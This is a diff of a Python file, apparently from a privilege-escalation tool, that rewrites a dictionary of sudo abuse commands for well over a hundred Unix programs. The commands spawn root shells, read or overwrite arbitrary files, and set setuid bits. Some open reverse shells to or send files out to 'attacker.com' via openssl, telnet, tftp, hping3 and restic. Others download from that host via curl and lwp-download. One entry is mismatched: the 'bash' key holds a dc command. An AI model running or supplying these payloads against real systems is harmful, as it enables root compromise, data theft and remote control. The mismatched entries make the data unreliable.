@@ -20,508 +20,791 @@ import select
 
 # SUDO_BINS_START
 sudo_bins={
-    "head": [
-        "LFILE=file_to_read\nsudo head -c1G \"$LFILE\"\n"
+    "dmesg": [
+        "sudo dmesg -H\n!/bin/sh\n"
     ],
-    "journalctl": [
-        "sudo journalctl\n!/bin/sh\n"
+    "tail": [
+        "LFILE=file_to_read\nsudo tail -c1G \"$LFILE\"\n"
     ],
-    "systemctl": [
-        "TF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice\n",
-        "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF\n",
-        "sudo systemctl\n!sh\n"
+    "systemd-resolve": [
+        "sudo systemd-resolve --status\n!sh\n"
     ],
-    "pdflatex": [
-        "sudo pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\npdftotext article.pdf -\n",
-        "sudo pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
-    ],
-    "arp": [
-        "LFILE=file_to_read\nsudo arp -v -f \"$LFILE\"\n"
-    ],
-    "vigr": [
-        "sudo vigr"
-    ],
-    "cmp": [
-        "LFILE=file_to_read\nsudo cmp $LFILE /dev/zero -b -l\n"
-    ],
-    "slsh": [
-        "sudo slsh -e 'system(\"/bin/sh\")'"
-    ],
-    "ash": [
-        "sudo ash"
-    ],
-    "cupsfilter": [
-        "LFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
-    ],
-    "apt": [
-        "sudo apt changelog apt\n!/bin/sh\n",
-        "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt install -c $TF sl\n",
-        "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh"
-    ],
-    "sshpass": [
-        "sudo sshpass /bin/sh"
-    ],
-    "aa-exec": [
-        "sudo aa-exec /bin/sh"
-    ],
-    "nm": [
-        "LFILE=file_to_read\nsudo nm @$LFILE\n"
-    ],
-    "cpulimit": [
-        "sudo cpulimit -l 100 -f /bin/sh"
-    ],
-    "ip": [
-        "LFILE=file_to_read\nsudo ip -force -batch \"$LFILE\"\n",
-        "sudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo\n",
-        "sudo ip netns add foo\nsudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar\nsudo ip netns exec bar /bin/sh\nsudo ip netns delete foo\nsudo ip netns delete bar\n"
-    ],
-    "ginsh": [
-        "sudo ginsh\n!/bin/sh\n"
+    "c99": [
+        "sudo c99 -wrapper /bin/sh,-s ."
     ],
     "ascii-xfr": [
         "LFILE=file_to_read\nsudo ascii-xfr -ns \"$LFILE\"\n"
     ],
-    "dvips": [
-        "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\nsudo dvips -R0 texput.dvi\n"
+    "efax": [
+        "LFILE=file_to_read\nsudo efax -d \"$LFILE\"\n"
+    ],
+    "as": [
+        "LFILE=file_to_read\nsudo as @$LFILE\n"
+    ],
+    "uuencode": [
+        "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"
+    ],
+    "chown": [
+        "LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE\n"
+    ],
+    "nice": [
+        "sudo nice /bin/sh"
+    ],
+    "fold": [
+        "LFILE=file_to_read\nsudo fold -w99999999 \"$LFILE\"\n"
+    ],
+    "top": [
+        "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc\nsudo top\n# press return twice\nreset\n"
+    ],
+    "comm": [
+        "LFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null\n"
+    ],
+    "sg": [
+        "sudo sg root\n"
+    ],
+    "wc": [
+        "LFILE=file_to_read\nsudo wc --files0-from \"$LFILE\"\n"
+    ],
+    "tftp": [
+        "RHOST=attacker.com\nsudo tftp $RHOST\nput file_to_send\n"
+    ],
+    "aa-exec": [
+        "sudo aa-exec /bin/sh"
+    ],
+    "scrot": [
+        "sudo scrot -e /bin/sh"
+    ],
+    "pdb": [
+        "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont\n"
+    ],
+    "ss": [
+        "LFILE=file_to_read\nsudo ss -a -F $LFILE\n"
+    ],
+    "nawk": [
+        "sudo nawk 'BEGIN {system(\"/bin/sh\")}'"
+    ],
+    "mysql": [
+        "sudo mysql -e '\\! /bin/sh'"
+    ],
+    "wish": [
+        "sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
+    ],
+    "loginctl": [
+        "sudo loginctl user-status\n!/bin/sh\n"
+    ],
+    "fmt": [
+        "LFILE=file_to_read\nsudo fmt -999 \"$LFILE\"\n"
+    ],
+    "yash": [
+        "sudo yash"
+    ],
+    "socat": [
+        "sudo socat stdin exec:/bin/sh\n"
+    ],
+    "ispell": [
+        "sudo ispell /etc/passwd\n!/bin/sh\n"
+    ],
+    "bconsole": [
+        "sudo bconsole\n@exec /bin/sh\n"
+    ],
+    "chmod": [
+        "LFILE=file_to_change\nsudo chmod 6777 $LFILE\n"
+    ],
+    "sqlite3": [
+        "sudo sqlite3 /dev/null '.shell /bin/sh'"
+    ],
+    "aspell": [
+        "LFILE=file_to_read\nsudo aspell -c \"$LFILE\"\n"
+    ],
+    "7z": [
+        "LFILE=file_to_read\nsudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so\n"
+    ],
+    "slsh": [
+        "sudo slsh -e 'system(\"/bin/sh\")'"
+    ],
+    "bash": [
+        "sudo dc -e '!/bin/sh'"
+    ],
+    "time": [
+        "sudo /usr/bin/time /bin/sh"
+    ],
+    "vagrant": [
+        "cd $(mktemp -d)\necho 'exec \"/bin/sh\"' > Vagrantfile\nvagrant up\n"
+    ],
+    "strings": [
+        "LFILE=file_to_read\nsudo strings \"$LFILE\"\n"
+    ],
+    "gem": [
+        "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc"
+    ],
+    "nohup": [
+        "sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""
+    ],
+    "vi": [
+        "sudo vi -c ':!/bin/sh' /dev/null"
+    ],
+    "snap": [
+        "sudo snap install xxxx_1.0_all.snap --dangerous --devmode\n"
+    ],
+    "unshare": [
+        "sudo unshare /bin/sh"
+    ],
+    "journalctl": [
+        "sudo journalctl\n!/bin/sh\n"
     ],
     "vimdiff": [
         "sudo vimdiff -c ':!/bin/sh'",
         "sudo vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
         "sudo vimdiff -c ':lua os.execute(\"reset; exec sh\")'"
     ],
-    "flock": [
-        "sudo flock -u / /bin/sh"
+    "check_ssl_cert": [
+        "COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\numask 022\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT\n"
     ],
-    "gcc": [
-        "sudo gcc -wrapper /bin/sh,-s ."
+    "espeak": [
+        "LFILE=file_to_read\nsudo espeak -qXf \"$LFILE\"\n"
     ],
-    "exiftool": [
-        "LFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT\n"
+    "latexmk": [
+        "sudo latexmk -e 'exec \"/bin/sh\";'"
     ],
-    "puppet": [
-        "sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n"
+    "openssl": [
+        "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n"
     ],
-    "psql": [
-        "psql\n\\?\n!/bin/sh\n"
+    "rake": [
+        "sudo rake -p '`/bin/sh 1>&0`'"
     ],
-    "joe": [
-        "sudo joe\n^K!/bin/sh\n"
+    "curl": [
+        "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE\n"
     ],
-    "find": [
-        "sudo find . -exec /bin/sh \\; -quit"
+    "ul": [
+        "LFILE=file_to_read\nsudo ul \"$LFILE\"\n"
+    ],
+    "c89": [
+        "sudo c89 -wrapper /bin/sh,-s ."
+    ],
+    "eqn": [
+        "LFILE=file_to_read\nsudo eqn \"$LFILE\"\n"
     ],
     "gdb": [
         "sudo gdb -nx -ex '!sh' -ex quit"
     ],
-    "openvt": [
-        "COMMAND=id\nTF=$(mktemp -u)\nsudo openvt -- sh -c \"$COMMAND >$TF 2>&1\"\ncat $TF\n"
+    "dvips": [
+        "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\nsudo dvips -R0 texput.dvi\n"
     ],
-    "make": [
-        "COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
+    "rview": [
+        "sudo rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
+        "sudo rview -c ':lua os.execute(\"reset; exec sh\")'"
+    ],
+    "emacs": [
+        "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"
     ],
     "diff": [
         "LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE\n"
     ],
-    "pkg": [
-        "sudo pkg install -y --no-repo-update ./x-1.0.txz\n"
+    "join": [
+        "LFILE=file_to_read\nsudo join -a 2 /dev/null $LFILE\n"
     ],
-    "minicom": [
-        "sudo minicom -D /dev/null\n"
+    "sash": [
+        "sudo sash"
     ],
-    "ksshell": [
-        "LFILE=file_to_read\nsudo ksshell -i $LFILE\n"
+    "run-parts": [
+        "sudo run-parts --new-session --regex '^sh$' /bin"
     ],
-    "ar": [
-        "TF=$(mktemp -u)\nLFILE=file_to_read\nsudo ar r \"$TF\" \"$LFILE\"\ncat \"$TF\"\n"
+    "certbot": [
+        "TF=$(mktemp -d)\nsudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'\n"
     ],
-    "ss": [
-        "LFILE=file_to_read\nsudo ss -a -F $LFILE\n"
+    "ash": [
+        "sudo ash"
     ],
-    "tftp": [
-        "RHOST=attacker.com\nsudo tftp $RHOST\nput file_to_send\n"
+    "pip": [
+        "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo pip install $TF\n"
     ],
-    "nice": [
-        "sudo nice /bin/sh"
+    "telnet": [
+        "RHOST=attacker.com\nRPORT=12345\nsudo telnet $RHOST $RPORT\n^]\n!/bin/sh\n"
+    ],
+    "pidstat": [
+        "COMMAND=id\nsudo pidstat -e $COMMAND\n"
+    ],
+    "ip": [
+        "LFILE=file_to_read\nsudo ip -force -batch \"$LFILE\"\n",
+        "sudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo\n",
+        "sudo ip netns add foo\nsudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar\nsudo ip netns exec bar /bin/sh\nsudo ip netns delete foo\nsudo ip netns delete bar\n"
+    ],
+    "genie": [
+        "sudo genie -c '/bin/sh'"
+    ],
+    "mail": [
+        "sudo mail --exec='!/bin/sh'"
+    ],
+    "tac": [
+        "LFILE=file_to_read\nsudo tac -s 'RANDOM' \"$LFILE\"\n"
+    ],
+    "whiptail": [
+        "LFILE=file_to_read\nsudo whiptail --textbox --scrolltext \"$LFILE\" 0 0\n"
+    ],
+    "awk": [
+        "sudo awk 'BEGIN {system(\"/bin/sh\")}'"
+    ],
+    "irb": [
+        "sudo irb\nexec '/bin/bash'\n"
+    ],
+    "task": [
+        "sudo task execute /bin/sh"
+    ],
+    "rpmverify": [
+        "sudo rpmverify --eval '%(/bin/sh 1>&2)'"
+    ],
+    "base32": [
+        "LFILE=file_to_read\nsudo base32 \"$LFILE\" | base32 --decode\n"
+    ],
+    "cupsfilter": [
+        "LFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
+    ],
+    "torsocks": [
+        "sudo torsocks /bin/sh"
+    ],
+    "xetex": [
+        "sudo xetex --shell-escape '\\write18{/bin/sh}\\end'\n"
+    ],
+    "install": [
+        "LFILE=file_to_change\nTF=$(mktemp)\nsudo install -m 6777 $LFILE $TF\n"
+    ],
+    "ed": [
+        "sudo ed\n!/bin/sh\n"
+    ],
+    "basenc": [
+        "LFILE=file_to_read\nsudo basenc --base64 $LFILE | basenc -d --base64\n"
+    ],
+    "tar": [
+        "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+    ],
+    "nsenter": [
+        "sudo nsenter /bin/sh"
+    ],
+    "psftp": [
+        "sudo psftp\n!/bin/sh\n"
+    ],
+    "puppet": [
+        "sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n"
+    ],
+    "rsync": [
+        "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
+    ],
+    "scanmem": [
+        "sudo scanmem\nshell /bin/sh\n"
+    ],
+    "gtester": [
+        "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"
+    ],
+    "unsquashfs": [
+        "sudo unsquashfs shell\n./squashfs-root/sh -p\n"
+    ],
+    "openvpn": [
+        "sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'\n",
+        "LFILE=file_to_read\nsudo openvpn --config \"$LFILE\"\n"
+    ],
+    "dmsetup": [
+        "sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'\n"
+    ],
+    "make": [
+        "COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
+    ],
+    "red": [
+        "sudo red file_to_write\na\nDATA\n.\nw\nq\n"
+    ],
+    "rlwrap": [
+        "sudo rlwrap /bin/sh"
+    ],
+    "split": [
+        "sudo split --filter=/bin/sh /dev/stdin\n"
+    ],
+    "jtag": [
+        "sudo jtag --interactive\nshell /bin/sh\n"
+    ],
+    "tbl": [
+        "LFILE=file_to_read\nsudo tbl $LFILE\n"
+    ],
+    "check_log": [
+        "LFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE\n"
+    ],
+    "ftp": [
+        "sudo ftp\n!/bin/sh\n"
+    ],
+    "ssh": [
+        "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"
+    ],
+    "hd": [
+        "LFILE=file_to_read\nsudo hd \"$LFILE\"\n"
+    ],
+    "runscript": [
+        "TF=$(mktemp)\necho '! exec /bin/sh' >$TF\nsudo runscript $TF\n"
+    ],
+    "lwp-download": [
+        "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo lwp-download $URL $LFILE\n"
+    ],
+    "less": [
+        "sudo less /etc/profile\n!/bin/sh\n"
+    ],
+    "service": [
+        "sudo service ../../bin/sh"
+    ],
+    "genisoimage": [
+        "LFILE=file_to_read\nsudo genisoimage -q -o - \"$LFILE\"\n"
+    ],
+    "perlbug": [
+        "sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'"
+    ],
+    "facter": [
+        "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter\n"
+    ],
+    "bundle": [
+        "sudo bundle help\n!/bin/sh\n"
+    ],
+    "pico": [
+        "sudo pico\n^R^X\nreset; sh 1>&0 2>&0\n"
+    ],
+    "zypper": [
+        "sudo zypper x\n",
+        "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nsudo PATH=$TF:$PATH zypper x\n"
+    ],
+    "check_by_ssh": [
+        "sudo check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx"
+    ],
+    "mawk": [
+        "sudo mawk 'BEGIN {system(\"/bin/sh\")}'"
+    ],
+    "lua": [
+        "sudo lua -e 'os.execute(\"/bin/sh\")'"
+    ],
+    "nano": [
+        "sudo nano\n^R^X\nreset; sh 1>&0 2>&0\n"
+    ],
+    "cobc": [
+        "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x\n"
+    ],
+    "csvtool": [
+        "sudo csvtool call '/bin/sh;false' /etc/passwd"
+    ],
+    "zip": [
+        "TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n"
+    ],
+    "highlight": [
+        "LFILE=file_to_read\nsudo highlight --no-doc --failsafe \"$LFILE\"\n"
+    ],
+    "hping3": [
+        "sudo hping3\n/bin/sh\n",
+        "RHOST=attacker.com\nLFILE=file_to_read\nsudo hping3 \"$RHOST\" --icmp --data 500 --sign xxx --file \"$LFILE\"\n"
+    ],
+    "choom": [
+        "sudo choom -n 0 /bin/sh"
+    ],
+    "rev": [
+        "LFILE=file_to_read\nsudo rev $LFILE | rev\n"
+    ],
+    "aoss": [
+        "sudo aoss /bin/sh"
+    ],
+    "virsh": [
+        "SCRIPT=script_to_run\nTF=$(mktemp)\ncat > $TF << EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='$SCRIPT'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nsudo virsh -c qemu:///system create $TF\nvirsh -c qemu:///system destroy x\n"
+    ],
+    "msgattrib": [
+        "LFILE=file_to_read\nsudo msgattrib -P $LFILE\n"
+    ],
+    "msgfilter": [
+        "echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'\n"
+    ],
+    "yarn": [
+        "sudo yarn exec /bin/sh"
+    ],
+    "sqlmap": [
+        "sudo sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\""
+    ],
+    "sed": [
+        "sudo sed -n '1e exec sh 1>&0' /etc/hosts"
+    ],
+    "mount": [
+        "sudo mount -o bind /bin/sh /bin/mount\nsudo mount\n"
+    ],
+    "vigr": [
+        "sudo vigr"
+    ],
+    "mosquitto": [
+        "LFILE=file_to_read\nsudo mosquitto -c \"$LFILE\"\n"
+    ],
+    "sort": [
+        "LFILE=file_to_read\nsudo sort -m \"$LFILE\"\n"
+    ],
+    "pic": [
+        "sudo pic -U\n.PS\nsh X sh X\n"
+    ],
+    "bc": [
+        "LFILE=file_to_read\nsudo bc -s $LFILE\nquit\n"
+    ],
+    "restic": [
+        "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
+    ],
+    "ln": [
+        "sudo ln -fs /bin/sh /bin/ln\nsudo ln\n"
+    ],
+    "find": [
+        "sudo find . -exec /bin/sh \\; -quit"
+    ],
+    "xdg-user-dir": [
+        "sudo xdg-user-dir '}; /bin/sh #'\n"
+    ],
+    "sshpass": [
+        "sudo sshpass /bin/sh"
+    ],
+    "start-stop-daemon": [
+        "sudo start-stop-daemon -n $RANDOM -S -x /bin/sh"
+    ],
+    "su": [
+        "sudo su"
+    ],
+    "tic": [
+        "LFILE=file_to_read\nsudo tic -C \"$LFILE\"\n"
+    ],
+    "ascii85": [
+        "LFILE=file_to_read\nsudo ascii85 \"$LFILE\" | ascii85 --decode\n"
+    ],
+    "ionice": [
+        "sudo ionice /bin/sh"
+    ],
+    "unexpand": [
+        "LFILE=file_to_read\nsudo unexpand -t99999999 \"$LFILE\"\n"
     ],
     "vim": [
         "sudo vim -c ':!/bin/sh'",
         "sudo vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
         "sudo vim -c ':lua os.execute(\"reset; exec sh\")'"
     ],
-    "base58": [
-        "LFILE=file_to_read\nsudo base58 \"$LFILE\" | base58 --decode\n"
+    "ncftp": [
+        "sudo ncftp\n!/bin/sh\n"
     ],
-    "pic": [
-        "sudo pic -U\n.PS\nsh X sh X\n"
+    "pkg": [
+        "sudo pkg install -y --no-repo-update ./x-1.0.txz\n"
     ],
-    "python": [
-        "sudo python -c 'import os; os.system(\"/bin/sh\")'"
+    "xmodmap": [
+        "LFILE=file_to_read\nsudo xmodmap -v $LFILE\n"
     ],
-    "update-alternatives": [
-        "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\nsudo update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n"
+    "easy_install": [
+        "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo easy_install $TF\n"
+    ],
+    "bpftrace": [
+        "sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'",
+        "TF=$(mktemp)\necho 'BEGIN {system(\"/bin/sh\");exit()}' >$TF\nsudo bpftrace $TF\n",
+        "sudo bpftrace -c /bin/sh -e 'END {exit()}'"
     ],
     "dnf": [
         "sudo dnf install -y x-1.0-1.noarch.rpm\n"
     ],
-    "softlimit": [
-        "sudo softlimit /bin/sh"
+    "ghci": [
+        "sudo ghci\nSystem.Process.callCommand \"/bin/sh\"\n"
     ],
-    "ansible-test": [
-        "sudo ansible-test shell"
+    "cowsay": [
+        "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowsay -f $TF x\n"
     ],
-    "nmap": [
-        "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n",
-        "sudo nmap --interactive\nnmap> !sh\n"
+    "jrunscript": [
+        "sudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""
     ],
-    "more": [
-        "TERM= sudo more /etc/profile\n!/bin/sh\n"
+    "git": [
+        "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help",
+        "sudo git -p help config\n!/bin/sh\n",
+        "sudo git branch --help config\n!/bin/sh\n",
+        "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\nsudo git -C \"$TF\" commit --allow-empty -m x\n",
+        "TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\nsudo git \"--exec-path=$TF\" x\n"
     ],
-    "ptx": [
-        "LFILE=file_to_read\nsudo ptx -w 5000 \"$LFILE\"\n"
+    "setlock": [
+        "sudo setlock - /bin/sh"
     ],
-    "ionice": [
-        "sudo ionice /bin/sh"
+    "gcloud": [
+        "sudo gcloud help\n!/bin/sh\n"
     ],
-    "as": [
-        "LFILE=file_to_read\nsudo as @$LFILE\n"
+    "eb": [
+        "sudo eb logs\n!/bin/sh\n"
     ],
-    "emacs": [
-        "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"
+    "pwsh": [
+        "sudo pwsh"
     ],
-    "vipw": [
-        "sudo vipw"
-    ],
-    "socat": [
-        "sudo socat stdin exec:/bin/sh\n"
-    ],
-    "zip": [
-        "TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n"
-    ],
-    "yum": [
-        "sudo yum localinstall -y x-1.0-1.noarch.rpm\n",
-        "TF=$(mktemp -d)\ncat >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y\n"
-    ],
-    "check_cups": [
-        "LFILE=file_to_read\nsudo check_cups --extra-opts=@$LFILE\n"
-    ],
-    "rake": [
-        "sudo rake -p '`/bin/sh 1>&0`'"
-    ],
-    "sash": [
-        "sudo sash"
+    "dd": [
+        "LFILE=file_to_write\necho \"data\" | sudo dd of=$LFILE\n"
     ],
     "jq": [
         "LFILE=file_to_read\nsudo jq -Rr . \"$LFILE\"\n"
     ],
-    "check_statusfile": [
-        "LFILE=file_to_read\nsudo check_statusfile $LFILE\n"
+    "arj": [
+        "TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\nsudo arj e \"$TF/a\" $LDIR\n"
     ],
-    "nano": [
-        "sudo nano\n^R^X\nreset; sh 1>&0 2>&0\n"
-    ],
-    "nasm": [
-        "LFILE=file_to_read\nsudo nasm -@ $LFILE\n"
-    ],
-    "grc": [
-        "sudo grc --pty /bin/sh"
-    ],
-    "uniq": [
-        "LFILE=file_to_read\nsudo uniq \"$LFILE\"\n"
-    ],
-    "cobc": [
-        "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x\n"
-    ],
-    "dstat": [
-        "echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx\n"
-    ],
-    "ghci": [
-        "sudo ghci\nSystem.Process.callCommand \"/bin/sh\"\n"
-    ],
-    "rpmdb": [
-        "sudo rpmdb --eval '%(/bin/sh 1>&2)'"
-    ],
-    "split": [
-        "sudo split --filter=/bin/sh /dev/stdin\n"
-    ],
-    "busybox": [
-        "sudo busybox sh"
-    ],
-    "unsquashfs": [
-        "sudo unsquashfs shell\n./squashfs-root/sh -p\n"
-    ],
-    "pico": [
-        "sudo pico\n^R^X\nreset; sh 1>&0 2>&0\n"
-    ],
-    "pry": [
-        "sudo pry\nsystem(\"/bin/sh\")\n"
-    ],
-    "lwp-request": [
-        "LFILE=file_to_read\nsudo lwp-request \"file://$LFILE\"\n"
-    ],
-    "ldconfig": [
-        "TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\nsudo ldconfig -f \"$TF/conf\"\n"
-    ],
-    "pr": [
-        "LFILE=file_to_read\npr -T $LFILE\n"
+    "check_cups": [
+        "LFILE=file_to_read\nsudo check_cups --extra-opts=@$LFILE\n"
     ],
     "rpmquery": [
         "sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"
     ],
-    "msguniq": [
-        "LFILE=file_to_read\nsudo msguniq -P $LFILE\n"
+    "elvish": [
+        "sudo elvish"
     ],
-    "view": [
-        "sudo view -c ':!/bin/sh'",
-        "sudo view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
-        "sudo view -c ':lua os.execute(\"reset; exec sh\")'"
+    "mtr": [
+        "LFILE=file_to_read\nsudo mtr --raw -F \"$LFILE\"\n"
     ],
-    "tbl": [
-        "LFILE=file_to_read\nsudo tbl $LFILE\n"
+    "neofetch": [
+        "TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nsudo neofetch --config $TF\n"
+    ],
+    "systemctl": [
+        "TF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice\n",
+        "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF\n",
+        "sudo systemctl\n!sh\n"
+    ],
+    "php": [
+        "CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"\n"
+    ],
+    "byebug": [
+        "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue\n"
+    ],
+    "man": [
+        "sudo man man\n!/bin/sh\n"
+    ],
+    "check_statusfile": [
+        "LFILE=file_to_read\nsudo check_statusfile $LFILE\n"
+    ],
+    "zsoelim": [
+        "LFILE=file_to_read\nsudo zsoelim \"$LFILE\"\n"
+    ],
+    "kubectl": [
+        "LFILE=dir_to_serve\nsudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n"
+    ],
+    "busybox": [
+        "sudo busybox sh"
+    ],
+    "fish": [
+        "sudo fish"
+    ],
+    "cpulimit": [
+        "sudo cpulimit -l 100 -f /bin/sh"
+    ],
+    "gzip": [
+        "LFILE=file_to_read\nsudo gzip -f $LFILE -t\n"
+    ],
+    "grep": [
+        "LFILE=file_to_read\nsudo grep '' $LFILE\n"
+    ],
+    "nft": [
+        "LFILE=file_to_read\nsudo nft -f \"$LFILE\"\n"
+    ],
+    "env": [
+        "sudo env /bin/sh"
+    ],
+    "cowthink": [
+        "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowthink -f $TF x\n"
+    ],
+    "file": [
+        "LFILE=file_to_read\nsudo file -f $LFILE\n"
+    ],
+    "gcc": [
+        "sudo gcc -wrapper /bin/sh,-s ."
     ],
     "cpio": [
